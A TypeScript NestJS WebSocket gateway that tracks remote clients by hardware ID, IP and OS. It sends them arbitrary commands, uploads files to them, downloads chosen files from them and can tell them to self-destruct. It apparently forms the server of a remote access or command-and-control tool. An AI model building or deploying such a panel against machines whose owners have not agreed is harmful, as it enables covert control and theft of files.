import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  OnGatewayInit,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from '@nestjs/websockets';
import { Server, Socket } from 'socket.io';
import { Client } from './entities/client.entity';
import { ClientService } from './client.service';
import { ConflictException, forwardRef, Inject } from '@nestjs/common';
import * as path from 'path';
import * as fs from 'fs';
import * as fse from 'fs-extra';

@WebSocketGateway()
export class ClientGateway
  implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect
{
  @WebSocketServer()
  server: Server;

  private clients: Map<string, Socket> = new Map();
  constructor(
    @Inject(forwardRef(() => ClientService))
    private clientService: ClientService,
  ) {}

  afterInit() {
    console.log('WebSocket Server initialized');
  }

  handleConnection(client: Socket) {
    console.log('Client connected:', client.id);
  }

  handleDisconnect(client: Socket) {
    console.log(`Client disconnected: ${client.id}`);
    this.clients.forEach((value, key) => {
      if (value.id === client.id) {
        this.clients.delete(key);
      }
    });
  }

  //Main functions

  @SubscribeMessage('register')
  handleRegister(client: Socket, data: Client) {
    console.log(`Received register event:`, data);

    if (!data || !data.hwid || !data.ip || !data.os) {
      console.error('Invalid register data:', data);
      return;
    }

    this.clientService.registerClient(data);

    this.clients.set(data.hwid, client);
    console.log(`Client ${data.hwid} registered with socket ID: ${client.id}`);
  }

  destroyConnection(hwid: string) {
    const clientSocket = this.clients.get(hwid);
    if (clientSocket) {
      clientSocket.emit('destroy');
      clientSocket.disconnect();
      this.clients.delete(hwid);
    }
  }

  sendCommandToClient(
    client: Client,
    command: string,
    callback: (response: string) => void,
  ) {
    const clientSocket = this.clients.get(client.hwid);

    if (!clientSocket) throw new ConflictException('Client not connected');

    clientSocket.once('commandResponse', (data) => {
      callback(data);
    });

    clientSocket.emit('sendCommand', command);
  }

  uploadFileToClient(client: Client, filename: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    const filePath = path.join(this.clientService.uploadPath, filename);
    const fileBuffer = fs.readFileSync(filePath);

    clientSocket.emit('receiveFile', { filename, fileBuffer });
  }

  downloadFileFromClient(client: Client, filePath: string, filename: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise<Buffer>((resolve, reject) => {
      clientSocket.emit('requestFile', { filePath, filename });
      clientSocket.once('fileResponse', async (data) => {
        if (data.status && data.fileBuffer) {
          try {
            await fse.ensureDir(this.clientService.downloadPath);
            const filePath = path.join(
              this.clientService.downloadPath,
              filename,
            );
            fs.writeFileSync(filePath, data.fileBuffer);
            console.log(`File ${filename} saved to ${filePath}`);
            resolve(data.fileBuffer);
          } catch (error) {
            console.error(`Failed to save file ${filename}`);
          }
        } else {
          console.error(`Failed to download file ${filename}`);
        }
      });
    });
  }
}
